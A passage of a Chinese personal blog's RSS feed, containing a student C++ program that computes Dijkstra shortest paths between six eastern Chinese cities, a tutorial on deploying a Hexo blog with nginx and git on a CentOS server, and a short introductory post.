&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;cstdio&amp;gt;
#include&amp;lt;cstring&amp;gt;
#include&amp;lt;conio.h&amp;gt;
#define MAXLEN 500
#define MAX 0x7FFFFFFF
using namespace std;
string CityList[MAXLEN];
int map[MAXLEN][MAXLEN]= {0};
int N;
bool check_input(int x,int y,int w,int N){
if (w&amp;lt;0 || x==y || x&amp;gt;N || y&amp;gt;N || (map[x][y]!=0 &amp;amp;&amp;amp; map[x][y]!=MAX)|| (map[x][y]!=0 &amp;amp;&amp;amp; map[x][y]!=MAX)){
cout&amp;lt;&amp;lt;&amp;quot;该组数据不符合规范，请重新输入&amp;quot;&amp;lt;&amp;lt;endl;
getch();
return true;
}
return false;
}
void Readin() {
int M,x,y,w;
memset(map,sizeof(map),0);
cout&amp;lt;&amp;lt;&amp;quot;请输入城市总数:&amp;quot;;
cin&amp;gt;&amp;gt;N;
cout&amp;lt;&amp;lt;&amp;quot;请输入路径数量:&amp;quot;;
cin&amp;gt;&amp;gt;M;
if (M&amp;gt;(N+1)*N/2){
cout&amp;lt;&amp;lt;&amp;quot;您输入的路径数量大于最大可能路径数量&amp;quot;&amp;lt;&amp;lt;endl;
getch();
return;
}
cout&amp;lt;&amp;lt;endl;
for (int i=1; i&amp;lt;=N; i++) {
printf(&amp;quot;第%d个城市名称:&amp;quot;,i);
cin&amp;gt;&amp;gt;CityList[i];
}
printf(&amp;quot;城市x编号 城市y编号 路径长度\n&amp;quot;);
printf(&amp;quot;-----------------------------\n&amp;quot;);
for (int i=1; i&amp;lt;=M; i++) {
do{
printf(&amp;quot;第%d组:&amp;quot;,i);
cin&amp;gt;&amp;gt;x&amp;gt;&amp;gt;y&amp;gt;&amp;gt;w;
}while(check_input(x,y,w,N));
map[x][y]=w;
map[y][x]=w;
}
for (int i=1; i&amp;lt;=N; i++) {
for (int j=1; j&amp;lt;=N; j++)
if (i!=j &amp;amp;&amp;amp; map[i][j]==0) map[i][j]=MAX;
}
}
void Mapprint(int n=N) {
if (N==0) return;
cout&amp;lt;&amp;lt;&amp;quot;\t&amp;quot;;
for (int i=1; i&amp;lt;=n; i++) cout&amp;lt;&amp;lt;CityList[i]&amp;lt;&amp;lt;&amp;quot;\t&amp;quot;;
cout&amp;lt;&amp;lt;endl;
for (int i=1; i&amp;lt;=n*9; i++) cout&amp;lt;&amp;lt;'-';
cout&amp;lt;&amp;lt;endl;
for (int i=1; i&amp;lt;=n; i++) {
cout&amp;lt;&amp;lt;CityList[i]&amp;lt;&amp;lt;&amp;quot;\t&amp;quot;;
for (int j=1; j&amp;lt;=n; j++)
if (map[i][j]!=MAX) cout&amp;lt;&amp;lt;map[i][j]&amp;lt;&amp;lt;&amp;quot;\t&amp;quot;;
else cout&amp;lt;&amp;lt;&amp;quot;-\t&amp;quot;;
cout&amp;lt;&amp;lt;endl;
}
}
void Mapadd() {
int n,x,y,w,m;
cout&amp;lt;&amp;lt;&amp;quot;请输入增加的城市个数:&amp;quot;;
cin&amp;gt;&amp;gt;n;
cout&amp;lt;&amp;lt;&amp;quot;请输入新增的路径个数:&amp;quot;;
cin&amp;gt;&amp;gt;m;
// if (m&amp;gt;(N*n+(n+1)*n/2)){
// cout&amp;lt;&amp;lt;&amp;quot;您输入的路径数量大于最大可能路径数量&amp;quot;&amp;lt;&amp;lt;endl;
// getch();
// return;
// }
cout&amp;lt;&amp;lt;endl;
for(int i=N+1; i&amp;lt;=N+n; i++) {
printf(&amp;quot;第%d个城市的名称:&amp;quot;,i);
cin&amp;gt;&amp;gt;CityList[i];
}
printf(&amp;quot;\n城市x编号 城市y编号 路径长度\n&amp;quot;);
printf(&amp;quot;-----------------------------\n&amp;quot;);
for (int i=1; i&amp;lt;=m; i++) {
do{
printf(&amp;quot;第%d组:&amp;quot;,i);
cin&amp;gt;&amp;gt;x&amp;gt;&amp;gt;y&amp;gt;&amp;gt;w;
}while (check_input(x,y,w,N+n));
map[x][y]=w;
map[y][x]=w;
}
for (int i=1;i&amp;lt;=N+n;i++)
for(int j=1;j&amp;lt;=N+n;j++)
if (i!=j &amp;amp;&amp;amp; map[i][j]==0) map[i][j]=MAX;
N=N+n;
}
void Delcol(int x) {
int i,j;
if (x&amp;gt;N or x&amp;lt;1) return;
for (i=1; i&amp;lt;=N; i++) {
for (j=x; j&amp;lt;N; j++)
map[i][j]=map[i][j+1];
map[i][j]=0;
}
}
void Delrow(int x) {
int i;
if (x&amp;gt;N or x&amp;lt;1) return;
for (i=x; i&amp;lt;N; i++)
memcpy(map[i],map[i+1],sizeof(int)*(N));
memset(map[i],0,N-1);
}
void Delname(int x) {
int i;
for (i=x; i&amp;lt;N; i++) CityList[i]=CityList[i+1];
CityList[i]= {0};
}
void Mapdel() {
int x;
cout&amp;lt;&amp;lt;&amp;quot;请输入您要删除的城市编号:&amp;quot;;
cin&amp;gt;&amp;gt;x;
Delname(x);
Delcol(x);
Delrow(x);
N--;
}
void Mapmod(){
string x,y;
int i,j,w;
cout&amp;lt;&amp;lt;&amp;quot;请输入您要修改的两个城市的名称&amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;quot;城市A:&amp;quot;; cin&amp;gt;&amp;gt;x;
cout&amp;lt;&amp;lt;&amp;quot;城市B:&amp;quot;; cin&amp;gt;&amp;gt;y;
cout&amp;lt;&amp;lt;&amp;quot;请输入修改值(输入值&amp;lt;=0删除路径):&amp;quot;; cin&amp;gt;&amp;gt;w;
for (i=1;i&amp;lt;=N;i++)
if (x==CityList[i]) break;
for (j=1;i&amp;lt;=N;j++)
if (y==CityList[j]) break;
if (i==N &amp;amp;&amp;amp; CityList[i]!=x){
cout&amp;lt;&amp;lt;&amp;quot;无法找到城市A&amp;quot;&amp;lt;&amp;lt;endl;
getch();
return;
}
if (j==N &amp;amp;&amp;amp; CityList[j]!=y){
cout&amp;lt;&amp;lt;&amp;quot;无法找到城市B&amp;quot;&amp;lt;&amp;lt;endl;
getch();
return;
}
if (w&amp;lt;=0) {
map[i][j]=MAX;
map[j][i]=MAX;
}
else{
map[i][j]=w;
map[j][i]=w;
}
}
bool check(bool* arr,int n){
for (int i=1;i&amp;lt;=n;i++)
if (!arr[i]) return true;
return false;
}
void Dijkstra(){
int d,s=1,pos,m;
cout&amp;lt;&amp;lt;&amp;quot;请输入目的地城市（默认出发城市即编号为1的城市）&amp;quot;&amp;lt;&amp;lt;endl;
cin&amp;gt;&amp;gt;d;
if (d&amp;gt;N){
cout&amp;lt;&amp;lt;&amp;quot;您输入的城市超出范围&amp;quot;&amp;lt;&amp;lt;endl;
getch();
return;
}
int dis[MAXLEN]={0};
bool is_v[MAXLEN];
string route[MAXLEN];
memset(is_v,0,sizeof(bool)*MAXLEN);
for (int i=1;i&amp;lt;=N;i++){
dis[i]=map[s][i];
route[i]=CityList[s]+&amp;quot;--&amp;gt;&amp;quot;+CityList[i];
}
dis[s]=0;
is_v[s]=true;
while (check(is_v,N)){
pos=0;
m=MAX;
for (int i=1;i&amp;lt;=N;i++)
if (!is_v[i] &amp;amp;&amp;amp; m&amp;gt;dis[i]){
m=dis[i];
pos=i;
}
is_v[pos]=true;
for (int i=1;i&amp;lt;=N;i++)
if (!is_v[i] &amp;amp;&amp;amp; dis[pos]+map[pos][i]&amp;gt;=0) {
if (dis[i]&amp;gt;dis[pos]+map[pos][i]){
dis[i]=dis[pos]+map[pos][i];
route[i]=route[pos]+&amp;quot;--&amp;gt;&amp;quot;+CityList[i];
}
}
}
if (dis[d]==0){
cout&amp;lt;&amp;lt;&amp;quot;不存在抵达该城市的路径&amp;quot;&amp;lt;&amp;lt;endl;
getch();
return;
}
cout&amp;lt;&amp;lt;&amp;quot;最短路径长度:&amp;quot;;
cout&amp;lt;&amp;lt;dis[d]&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;route[d]&amp;lt;&amp;lt;endl;
getch();
}
void logo(){
system(&amp;quot;cls&amp;quot;);
printf(&amp;quot; ____ _ _ __ __ \n&amp;quot;);
printf(&amp;quot; / __ \(_) (_) /_______/ /__________ _\n&amp;quot;);
printf(&amp;quot; / / / / / / / //_/ ___/ __/ ___/ __ `/\n&amp;quot;);
printf(&amp;quot; / /_/ / / / / ,&amp;lt; (__ ) /_/ / / /_/ / \n&amp;quot;);
printf(&amp;quot; /_____/_/_/ /_/|_/____/\\__/_/ \\__,_/ \n&amp;quot;);
printf(&amp;quot; /___/ \n&amp;quot;);
cout&amp;lt;&amp;lt;&amp;quot; --code by Yuuki | cc&amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;quot;=============================================&amp;quot;&amp;lt;&amp;lt;endl;
Mapprint();
cout&amp;lt;&amp;lt;&amp;quot;=============================================&amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;quot; 1.录入城市路径 &amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;quot; 2.增加城市路径 &amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;quot; 3.编辑城市路径 &amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;quot; 4.删除城市 &amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;quot; 5.计算最短路径 &amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;quot; 0.退出 &amp;quot;&amp;lt;&amp;lt;endl;
}
void init(){
N=6;
CityList[1]=&amp;quot;南京&amp;quot;;
CityList[2]=&amp;quot;镇江&amp;quot;;
CityList[3]=&amp;quot;常州&amp;quot;;
CityList[4]=&amp;quot;苏州&amp;quot;;
CityList[5]=&amp;quot;无锡&amp;quot;;
CityList[6]=&amp;quot;上海&amp;quot;;
map[1][2]=1;
map[2][1]=1;
map[2][4]=3;
map[4][2]=3;
map[4][6]=15;
map[6][4]=15;
map[5][6]=4;
map[6][5]=4;
map[5][3]=5;
map[3][5]=5;
map[1][3]=12;
map[3][1]=12;
map[2][3]=9;
map[3][2]=9;
map[3][4]=4;
map[4][3]=4;
map[4][5]=13;
map[5][4]=13;
for (int i=1;i&amp;lt;=N;i++)
for (int j=1;j&amp;lt;=N;j++)
if (i!=j &amp;amp;&amp;amp; map[i][j]==0) map[i][j]=MAX;
}
int main() {
string choice;
N=0;
init();
while (true){
logo();
cin&amp;gt;&amp;gt;choice;
switch(choice[0]){
case '1': Readin(); break;
case '2': Mapadd(); break;
case '3': Mapmod(); break;
case '4': Mapdel(); break;
case '5': Dijkstra(); break;
case '0': return 0;
default:
continue;
}
}
return 0;
}
&lt;/code>&lt;/pre></description></item><item><title>VPS+nginx+hexo搭建个人博客</title><link>https://blog.yuukisama.cc/p/vps-nginx-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</link><pubDate>Thu, 27 Dec 2018 15:54:11 +0000</pubDate><guid>https://blog.yuukisama.cc/p/vps-nginx-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</guid><description>&lt;h2 id="开始前的碎碎念">开始前的碎碎念&lt;/h2>
&lt;h3 id="为了搭建这个小站搜索了很多资料踩了很多坑这里努力写点有用的东西防止后人踩坑希望阅读的读者遇到问题时思考自己是否是符合本样例的情况">为了搭建这个小站，搜索了很多资料，踩了很多坑。这里努力写点有用的东西防止后人踩坑。希望阅读的读者遇到问题时思考自己是否是符合本样例的情况。&lt;/h3>
&lt;p>这是一篇旨在使用linux服务器+nginx+hexo+git实现搭建个人博客的教学性质文章。&lt;/p>
&lt;h2 id="requires">requires&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>一台服务器，本例子是linux centos,阿里的云服务器&lt;/p>
&lt;pre tabindex="0">&lt;code>[root@host~]# lsb_release -a
LSB Version: :core-4.1-amd64:core-4.1-noarch
Distributor ID: CentOS
Description: CentOS Linux release 7.6.1810 (Core)
Release: 7.6.1810
Codename: Core
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>本地电脑：window 10&lt;/p>
&lt;/li>
&lt;li>
&lt;p>nginx ; node.js ; hexo ; git ; npm&lt;/p>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="本地电脑">本地电脑&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>安装git&lt;/p>
&lt;ul>
&lt;li>
&lt;p>windows &lt;a class="link" href="https://git-scm.com/downloads" target="_blank" rel="noopener"
>下载&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>linux使用包管理器安装git &lt;del>(不了解包管理器的同学就不要看下去了吧)&lt;/del>&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install git -y
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>更多&lt;a class="link" href="https://git-scm.com/book/zh/v1" target="_blank" rel="noopener"
>Git基本配置工作&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>安装node.js (node.js自带npm)&lt;/p>
&lt;p>&lt;a class="link" href="https://zh.wikipedia.org/wiki/Npm" target="_blank" rel="noopener"
>什么是npm，本垃圾觉得大概类似python的pip吧&lt;del>什么你不知道pip是啥？？？这是wiki打不开就算了&lt;/del>&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>windows
&lt;a class="link" href="https://nodejs.org/zh-cn/download/" target="_blank" rel="noopener"
>下载&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>linux
下载对应版本的node.js以及安装操作
&lt;a class="link" href="https://nodejs.org/zh-cn/download/" target="_blank" rel="noopener"
>下载&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>安装hexo&lt;/p>
&lt;p>使用node.js的npm安装hexo，这里windows可以先设置一下npm的默认安装目录，本强迫症表示你默认装在c盘我很难受。打开命令行，运行:&lt;/p>
&lt;p>&lt;strong>坑：原教程里写了路径末尾加了node_modules，事实证明并不需要，这个命令会在目标目录生成一个node_modules。我这里设置默认安装路径在node.js本体的安装路径，因为这个路径里本身就有一个用于安装npm本身的nnode_modules文件夹。当然即使这样做了，npm运行缓存还是会存在c盘，需要继续修改设置的请移步&lt;a class="link" href="https://www.jianshu.com/p/645c758d4428" target="_blank" rel="noopener"
>这里&lt;/a>&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>npm config set prefix &amp;quot;E:\node.js\&amp;quot;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>安装hexo
&lt;pre tabindex="0">&lt;code>npm install -g hexo-cli
&lt;/code>&lt;/pre>&lt;strong>坑：-g意为global，全局安装就会安装到你设置的安装目录里，没有这个参数默认会安装在你npm当时命令行运行的目录里创建node_moudels并进行安装&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>搭建博客&lt;/p>
&lt;p>&lt;strong>后续关于博客搭建的章节可以参照&lt;a class="link" href="https://hexo.io/zh-cn/docs/setup" target="_blank" rel="noopener"
>官方教程&lt;/a>&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>创建一个文件夹用于做博客的目录&lt;/li>
&lt;li>切换到这个文件夹所在目录，运行命令：
&lt;pre tabindex="0">&lt;code>hexo init &amp;lt;folder name&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>进入该文件夹：
&lt;pre tabindex="0">&lt;code>npm install
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>坑：以上两步必不可缺，否则会产生缺少依赖问题，列入不生成静态文件（如x.html）的问题&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>配置你的站点：&lt;/p>
&lt;ul>
&lt;li>修改博客目录下的_congfig.yml文件&lt;a class="link" href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener"
>官方教程&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>书写你的第一篇文章：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在你的博客文件夹内运行命令&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo new &amp;quot;Hallow world&amp;quot;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>会在source文件夹内的默认_posts文件夹下生成一个md文件，接下来就可以参照markdown语法愉快的敲代码了&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>生成你的网站：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在你的博客文件夹内运行命令&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo generate
&lt;/code>&lt;/pre>&lt;p>或者使用快捷缩写&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo g
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>在本地预览你的博客网站&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo server
&lt;/code>&lt;/pre>&lt;p>或者使用快捷缩写&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo s
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>坑：如果generate出错请检查博客文件夹下_config.yml内的配置是否正确，每一个冒号后面必须跟一个空格！！！&lt;/strong>&lt;/p>
&lt;p>&lt;strong>坑：如果没能本地预览可能是因为缺少hexo-server，请运行npm install hexo-server &amp;ndash;save&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>安装hexo-deployer-git&lt;/p>
&lt;p>安装该模块方便使用hexo最牛逼的推送功能&lt;/p>
&lt;pre tabindex="0">&lt;code>npm install hexo-deployer-git --save
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>本地配置git生成私钥以及公钥&lt;/p>
&lt;p>在git安装配置没有出错的情况下，环境变量完成配置，用户信息设置完全的情况下：&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh-keygen -t rsa -C &amp;quot;your_email@email.com&amp;quot;
&lt;/code>&lt;/pre>&lt;p>该命令会在c:\user(你的电脑用户名).ssh文件加下生成密钥对。id_rsa文件为私钥，id_rsa.pub为公钥。
&lt;strong>在后续的服务器配置过程中，我们会把公钥设置在服务器上，这样git推送的时候就可以免去密码认证&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="服务器配置linux">服务器配置（linux）&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>安装nginx&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install nginx -y
&lt;/code>&lt;/pre>&lt;p>你也可以使用lnmp一类的一键脚本安装web环境，这里不举例。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>配置nginx&lt;/p>
&lt;ul>
&lt;li>
&lt;p>基本配置&lt;/p>
&lt;p>找到nginx的配置文件，默认在/etc/nginx/nginx.conf编辑内容&lt;/p>
&lt;p>基本只需要简单的修改默认配置中的网站根目录以及域名的设置，找到如下字段&lt;/p>
&lt;pre tabindex="0">&lt;code>listen 80 default_server; # 默认端口
listen [::]:80 default_server;
server_name _; # 你的域名，没有的话根目录即可
root /home/www/blog; # 网站根目录,教程后续创建
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>启动nginx：&lt;/p>
&lt;pre tabindex="0">&lt;code>service nginx start
service nginx reload
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>设置开机自启：&lt;/p>
&lt;pre tabindex="0">&lt;code>chkconfig nginx on
&lt;/code>&lt;/pre>&lt;p>或者&lt;/p>
&lt;pre tabindex="0">&lt;code>systemctl enable nginx.servcice
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>开放防火墙放行80端口&lt;/p>
&lt;ul>
&lt;li>
&lt;p>运行&lt;/p>
&lt;pre tabindex="0">&lt;code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>保存防火墙设置&lt;/p>
&lt;pre tabindex="0">&lt;code>service iptables save
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑：本人这条命令并没有执行成功，这个版本的linux似乎不支持这条命令，最后还是执行的service iptables reload&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>查看防火墙规则:
出现这条内容意味着防火墙设置完成:&lt;/p>
&lt;pre tabindex="0">&lt;code>[root@host ~]# iptables --list -n
Chain INPUT (policy ACCEPT)
target prot opt source destination
ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>坑：云服务器供应商还会提供安全组一类的东西，请在那里面也放行对应端口&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>测试nginx是否配置成功&lt;/p>
&lt;ul>
&lt;li>服务器本地访问又返回结果：
&lt;pre tabindex="0">&lt;code>curl 127.0.0.1
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>远程访问服务器网页端口，即在你的浏览器里输入服务器ip或者域名出现nginx默认页面即表示配置完成。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>配置git&lt;/p>
&lt;ul>
&lt;li>
&lt;p>如果服务器没有git请参照上面安装git&lt;/p>
&lt;/li>
&lt;li>
&lt;p>新建git用户,并设置用户密码&lt;/p>
&lt;pre tabindex="0">&lt;code>useradd git
passwd git
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>新建网站目录,并修改网站根目录的用户拥有者为git用户&lt;/p>
&lt;pre tabindex="0">&lt;code>cd /home
mkdir www
cd www
mkdir blog
chown git:git blog
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>切换为git用户，进入其家目录创建.ssh文件夹，并进入&lt;/p>
&lt;pre tabindex="0">&lt;code>su git
cd ~
mkdir .ssh
cd .ssh
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>创建authorized_keys文件，讲你本地电脑上的公钥内的文件内容复制到该文件内。&lt;/p>
&lt;p>&lt;del>这里怎么操作自我发挥吧，把公钥文件传上来该跟名字，或者你开心就好&lt;/del>&lt;/p>
&lt;p>设置密钥文件只读，文件夹权限:&lt;/p>
&lt;pre tabindex="0">&lt;code>chmod 600 authorized_keys
chmod 700 /home/git/.ssh
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ul>
&lt;li>配置ssh的配置文件/etc/ssh/sshd_config，修改如下词条&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>RSAAuthentication yes # 开启rsa密钥认证
PubkeyAuthentication yes # 开启公钥认证
AuthorizedKeysFile .ssh/authorized_keys # 设置存贮文件
&lt;/code>&lt;/pre>&lt;hr>
&lt;ul>
&lt;li>
&lt;p>在你的git用户家目录下新建你的博客仓库,并初始化为git裸仓库&lt;/p>
&lt;pre tabindex="0">&lt;code>mkdir blog.git
git init --bare blog.git
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>配置裸仓库:进入仓库文件夹，在hooks文件夹内新建post_receive。文件写下一下内容&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/bin/bash
git --work-tree=/home/www/blog --git-dir=/home/git/blog.git checkout -f
&lt;/code>&lt;/pre>&lt;p>这是一个linux shell规定了当接受到post请求之后的动作，把文件内容放到网站根目录里&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>在你的本地！！！&lt;/strong> 测试ssh 免密码连接
&lt;code>ssh -T git@your_host&lt;/code>
如果没有提示输入密码证明配置成功&lt;/p>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="回到本地电脑">回到本地电脑&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>编辑blog下的配置文件_config.yml&lt;/p>
&lt;pre tabindex="0">&lt;code># Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
type: git
repo: git@your_host:blog.git
branch: master
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>愉快的测试推送把！~ &lt;del>或者死于bug error hhh&lt;/del>&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo deploy
&lt;/code>&lt;/pre>&lt;p>或者&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo d
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>坑：不安装hexo-deployer-git是不可能推送的&lt;/strong>&lt;/p>
&lt;p>&lt;strong>坑：如果访问页面出现cantnot GET/ 请检查主题设置，网上很多教程的设置基于hexo next主题，涉及到主题文件的请看你的主题的作者自己的文档，而不是看某dn&lt;/strong>&lt;/p></description></item><item><title>Hello World</title><link>https://blog.yuukisama.cc/p/hello-world/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://blog.yuukisama.cc/p/hello-world/</guid><description>&lt;h2 id="一些写在开始的碎碎念">一些写在开始的碎碎念&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>折腾了好久才建好这个万恶的博客。以前是用的lnmp环境外傻瓜式的wordpress搭建了一个积灰博客。这次一切推到重来，使用新的框架——nginx+hexo的组合。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>也是这次开始，有了认认真真写博客的想法。记录一下自己踩过的坑，以及希望以后有人问我问 题我可以直接甩手给博客，而不是手把手一遍又一遍的重复同样的内容让我心很累。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>另外，还请各位大师傅手下留情·····&lt;/p>
&lt;/li>
&lt;li>
&lt;p>顺便这里应该是个二次元的主题站点吧，就这样。&lt;/p>
&lt;/li>
&lt;/ul></description></item></channel></rss>